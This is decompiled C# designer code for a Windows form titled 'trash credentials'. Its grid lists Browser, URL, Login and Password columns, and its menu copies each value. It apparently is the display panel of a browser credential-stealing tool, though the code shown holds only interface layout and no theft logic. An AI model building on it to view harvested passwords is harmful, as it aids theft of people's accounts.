namespace Trash
{
	// Token: 0x02000016 RID: 22
	public partial class credentials : global::System.Windows.Forms.Form
	{
		// Token: 0x060000F4 RID: 244 RVA: 0x0000299A File Offset: 0x00000B9A
		protected override void Dispose(bool disposing)
		{
			if (disposing && this.components != null)
			{
				this.components.Dispose();
			}
			base.Dispose(disposing);
		}

		// Token: 0x060000F5 RID: 245 RVA: 0x0000B424 File Offset: 0x00009624
		private void InitializeComponent()
		{
			this.components = new global::System.ComponentModel.Container();
			global::System.ComponentModel.ComponentResourceManager componentResourceManager = new global::System.ComponentModel.ComponentResourceManager(typeof(global::Trash.credentials));
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new global::System.Windows.Forms.DataGridViewCellStyle();
			global::System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new global::System.Windows.Forms.DataGridViewCellStyle();
			this.label1 = new global::System.Windows.Forms.Label();
			this.exitFormButton = new global::System.Windows.Forms.Button();
			this.bunifuCustomDataGrid1 = new global::Bunifu.Framework.UI.BunifuCustomDataGrid();
			this.Browser = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.URL = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Login = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.Password = new global::System.Windows.Forms.DataGridViewTextBoxColumn();
			this.contextMenuStrip1 = new global::System.Windows.Forms.ContextMenuStrip(this.components);
			this.toolStripMenuItem1 = new global::System.Windows.Forms.ToolStripMenuItem();
			this.copyLoginToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			this.copyPasswordToolStripMenuItem = new global::System.Windows.Forms.ToolStripMenuItem();
			((global::System.ComponentModel.ISupportInitialize)this.bunifuCustomDataGrid1).BeginInit();
			this.contextMenuStrip1.SuspendLayout();
			base.SuspendLayout();
			this.label1.AutoSize = true;
			this.label1.Font = new global::System.Drawing.Font("Segoe UI Semilight", 12f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			this.label1.ForeColor = global::System.Drawing.Color.White;
			this.label1.Location = new global::System.Drawing.Point(12, 9);
			this.label1.Name = "label1";
			this.label1.Size = new global::System.Drawing.Size(122, 21);
			this.label1.TabIndex = 0;
			this.label1.Text = "trash credentials";
			this.exitFormButton.Cursor = global::System.Windows.Forms.Cursors.Hand;
			this.exitFormButton.FlatAppearance.BorderSize = 0;
			this.exitFormButton.FlatAppearance.MouseDownBackColor = global::System.Drawing.Color.Transparent;
			this.exitFormButton.FlatAppearance.MouseOverBackColor = global::System.Drawing.Color.Transparent;
			this.exitFormButton.FlatStyle = global::System.Windows.Forms.FlatStyle.Flat;
			this.exitFormButton.Image = (global::System.Drawing.Image)componentResourceManager.GetObject("exitFormButton.Image");
			this.exitFormButton.Location = new global::System.Drawing.Point(710, 7);
			this.exitFormButton.Name = "exitFormButton";
			this.exitFormButton.Size = new global::System.Drawing.Size(27, 23);
			this.exitFormButton.TabIndex = 4;
			this.exitFormButton.UseVisualStyleBackColor = true;
			this.exitFormButton.Click += new global::System.EventHandler(this.exitFormButton_Click);
			this.bunifuCustomDataGrid1.AllowUserToAddRows = false;
			this.bunifuCustomDataGrid1.AllowUserToDeleteRows = false;
			this.bunifuCustomDataGrid1.AllowUserToResizeColumns = false;
			this.bunifuCustomDataGrid1.AllowUserToResizeRows = false;
			dataGridViewCellStyle.BackColor = global::System.Drawing.Color.FromArgb(224, 224, 224);
			this.bunifuCustomDataGrid1.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
			this.bunifuCustomDataGrid1.BackgroundColor = global::System.Drawing.Color.Gray;
			this.bunifuCustomDataGrid1.BorderStyle = global::System.Windows.Forms.BorderStyle.None;
			this.bunifuCustomDataGrid1.CellBorderStyle = global::System.Windows.Forms.DataGridViewCellBorderStyle.SingleHorizontal;
			this.bunifuCustomDataGrid1.ClipboardCopyMode = global::System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
			this.bunifuCustomDataGrid1.ColumnHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle2.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle2.BackColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			dataGridViewCellStyle2.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 9f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 0);
			dataGridViewCellStyle2.ForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle2.SelectionBackColor = global::System.Drawing.SystemColors.Highlight;
			dataGridViewCellStyle2.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
			dataGridViewCellStyle2.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.bunifuCustomDataGrid1.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
			this.bunifuCustomDataGrid1.ColumnHeadersHeightSizeMode = global::System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
			this.bunifuCustomDataGrid1.Columns.AddRange(new global::System.Windows.Forms.DataGridViewColumn[]
			{
				this.Browser,
				this.URL,
				this.Login,
				this.Password
			});
			this.bunifuCustomDataGrid1.ContextMenuStrip = this.contextMenuStrip1;
			dataGridViewCellStyle3.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle3.BackColor = global::System.Drawing.SystemColors.Window;
			dataGridViewCellStyle3.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle3.ForeColor = global::System.Drawing.SystemColors.ControlText;
			dataGridViewCellStyle3.SelectionBackColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			dataGridViewCellStyle3.SelectionForeColor = global::System.Drawing.Color.White;
			dataGridViewCellStyle3.WrapMode = global::System.Windows.Forms.DataGridViewTriState.False;
			this.bunifuCustomDataGrid1.DefaultCellStyle = dataGridViewCellStyle3;
			this.bunifuCustomDataGrid1.DoubleBuffered = true;
			this.bunifuCustomDataGrid1.EnableHeadersVisualStyles = false;
			this.bunifuCustomDataGrid1.HeaderBgColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			this.bunifuCustomDataGrid1.HeaderForeColor = global::System.Drawing.Color.White;
			this.bunifuCustomDataGrid1.Location = new global::System.Drawing.Point(16, 51);
			this.bunifuCustomDataGrid1.Name = "bunifuCustomDataGrid1";
			this.bunifuCustomDataGrid1.RowHeadersBorderStyle = global::System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
			dataGridViewCellStyle4.Alignment = global::System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
			dataGridViewCellStyle4.BackColor = global::System.Drawing.SystemColors.Control;
			dataGridViewCellStyle4.Font = new global::System.Drawing.Font("Microsoft Sans Serif", 8.25f, global::System.Drawing.FontStyle.Regular, global::System.Drawing.GraphicsUnit.Point, 204);
			dataGridViewCellStyle4.ForeColor = global::System.Drawing.SystemColors.WindowText;
			dataGridViewCellStyle4.SelectionBackColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			dataGridViewCellStyle4.SelectionForeColor = global::System.Drawing.SystemColors.HighlightText;
			dataGridViewCellStyle4.WrapMode = global::System.Windows.Forms.DataGridViewTriState.True;
			this.bunifuCustomDataGrid1.RowHeadersDefaultCellStyle = dataGridViewCellStyle4;
			this.bunifuCustomDataGrid1.RowHeadersWidthSizeMode = global::System.Windows.Forms.DataGridViewRowHeadersWidthSizeMode.DisableResizing;
			this.bunifuCustomDataGrid1.SelectionMode = global::System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
			this.bunifuCustomDataGrid1.ShowEditingIcon = false;
			this.bunifuCustomDataGrid1.Size = new global::System.Drawing.Size(707, 190);
			this.bunifuCustomDataGrid1.TabIndex = 5;
			this.Browser.Frozen = true;
			this.Browser.HeaderText = "Browser";
			this.Browser.Name = "Browser";
			this.Browser.ReadOnly = true;
			this.Browser.Width = 70;
			this.URL.Frozen = true;
			this.URL.HeaderText = "URL";
			this.URL.Name = "URL";
			this.URL.ReadOnly = true;
			this.URL.Width = 250;
			this.Login.Frozen = true;
			this.Login.HeaderText = "Login";
			this.Login.Name = "Login";
			this.Login.ReadOnly = true;
			this.Login.Width = 150;
			this.Password.Frozen = true;
			this.Password.HeaderText = "Password";
			this.Password.Name = "Password";
			this.Password.ReadOnly = true;
			this.Password.Width = 200;
			this.contextMenuStrip1.Items.AddRange(new global::System.Windows.Forms.ToolStripItem[]
			{
				this.toolStripMenuItem1,
				this.copyLoginToolStripMenuItem,
				this.copyPasswordToolStripMenuItem
			});
			this.contextMenuStrip1.Name = "contextMenuStrip1";
			this.contextMenuStrip1.Size = new global::System.Drawing.Size(156, 70);
			this.toolStripMenuItem1.Name = "toolStripMenuItem1";
			this.toolStripMenuItem1.Size = new global::System.Drawing.Size(155, 22);
			this.toolStripMenuItem1.Text = "Copy URL";
			this.toolStripMenuItem1.Click += new global::System.EventHandler(this.toolStripMenuItem1_Click);
			this.copyLoginToolStripMenuItem.Name = "copyLoginToolStripMenuItem";
			this.copyLoginToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.copyLoginToolStripMenuItem.Text = "Copy login";
			this.copyLoginToolStripMenuItem.Click += new global::System.EventHandler(this.copyLoginToolStripMenuItem_Click);
			this.copyPasswordToolStripMenuItem.Name = "copyPasswordToolStripMenuItem";
			this.copyPasswordToolStripMenuItem.Size = new global::System.Drawing.Size(155, 22);
			this.copyPasswordToolStripMenuItem.Text = "Copy password";
			this.copyPasswordToolStripMenuItem.Click += new global::System.EventHandler(this.copyPasswordToolStripMenuItem_Click);
			base.AutoScaleDimensions = new global::System.Drawing.SizeF(6f, 13f);
			base.AutoScaleMode = global::System.Windows.Forms.AutoScaleMode.Font;
			this.BackColor = global::System.Drawing.Color.FromArgb(64, 64, 64);
			base.ClientSize = new global::System.Drawing.Size(749, 253);
			base.Controls.Add(this.bunifuCustomDataGrid1);
			base.Controls.Add(this.exitFormButton);
			base.Controls.Add(this.label1);
			base.FormBorderStyle = global::System.Windows.Forms.FormBorderStyle.None;
			base.Icon = (global::System.Drawing.Icon)componentResourceManager.GetObject("$this.Icon");
			base.Name = "credentials";
			this.Text = "credentials";
			base.MouseDown += new global::System.Windows.Forms.MouseEventHandler(this.Form1_MouseDown);
			base.MouseMove += new global::System.Windows.Forms.MouseEventHandler(this.Form1_MouseMove);
			base.MouseUp += new global::System.Windows.Forms.MouseEventHandler(this.Form1_MouseUp);
			((global::System.ComponentModel.ISupportInitialize)this.bunifuCustomDataGrid1).EndInit();
			this.contextMenuStrip1.ResumeLayout(false);
			base.ResumeLayout(false);
			base.PerformLayout();
		}

		// Token: 0x040000B0 RID: 176
		private global::System.ComponentModel.IContainer components;

		// Token: 0x040000B1 RID: 177
		private global::System.Windows.Forms.Label label1;

		// Token: 0x040000B2 RID: 178
		private global::System.Windows.Forms.Button exitFormButton;

		// Token: 0x040000B3 RID: 179
		private global::Bunifu.Framework.UI.BunifuCustomDataGrid bunifuCustomDataGrid1;

		// Token: 0x040000B4 RID: 180
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Browser;

		// Token: 0x040000B5 RID: 181
		private global::System.Windows.Forms.DataGridViewTextBoxColumn URL;

		// Token: 0x040000B6 RID: 182
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Login;

		// Token: 0x040000B7 RID: 183
		private global::System.Windows.Forms.DataGridViewTextBoxColumn Password;

		// Token: 0x040000B8 RID: 184
		private global::System.Windows.Forms.ContextMenuStrip contextMenuStrip1;

		// Token: 0x040000B9 RID: 185
		private global::System.Windows.Forms.ToolStripMenuItem toolStripMenuItem1;

		// Token: 0x040000BA RID: 186
		private global::System.Windows.Forms.ToolStripMenuItem copyLoginToolStripMenuItem;

		// Token: 0x040000BB RID: 187
		private global::System.Windows.Forms.ToolStripMenuItem copyPasswordToolStripMenuItem;
	}
}
